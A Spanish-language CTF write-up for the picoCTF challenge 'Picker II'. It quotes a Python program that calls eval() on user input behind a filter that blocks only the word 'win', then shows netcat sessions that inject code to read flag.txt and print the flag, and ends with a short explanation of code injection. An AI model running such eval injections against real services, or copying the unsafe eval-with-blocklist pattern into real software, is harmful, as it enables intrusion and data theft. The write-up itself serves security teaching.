##  Picker II
## Descripcion
Can you figure out how this program works to get the flag?Connect to the program with netcat:`$ nc saturn.picoctf.net 49303`The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/522/picker-II.py).
## Solucion

## Picker II
-  Descargamos el código fuente que nos dan con el reto y lo analizamos, el programa ejecuta la función que se le pasa como parámetro, pero filtra la llamada a la función win:
```python

def filter(user_input):
  if 'win' in user_input:
    return False
  return True

while(True):
  try:
    user_input = input('==> ')
    if( filter(user_input) ):
      eval(user_input + '()')
    else:
      print('Illegal input')
  except Exception as e:
    print(e)
    break
```
- Verificamos si la llamada a `eval()` dentro de la función principal ejecuta lo que le pasamos
```bash
nc saturn.picoctf.net 64571
==> print(4*4)
16
'NoneType' object is not callable
```
- Replicamos lo que la función win() hace y leemos la bandera directamente
```bash
nc saturn.picoctf.net 64571
==> print(open('flag.txt','r').read())
picoCTF{...}
'NoneType' object is not callable
```

**picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_0b5f1131}**

## Notas
- **Inyección de Código (Code Injection):** El fallo crítico de la aplicación es que confía ciegamente en lo que escribe el usuario. En lenguajes como Python, funciones como `eval()` o `exec()` toman una cadena de texto y la ejecutan como si fuera código del programa. Al no validar tu entrada, te permitió llamar a la función `win()` que el desarrollador dejó "escondida" en el código fuente.
## Referencias
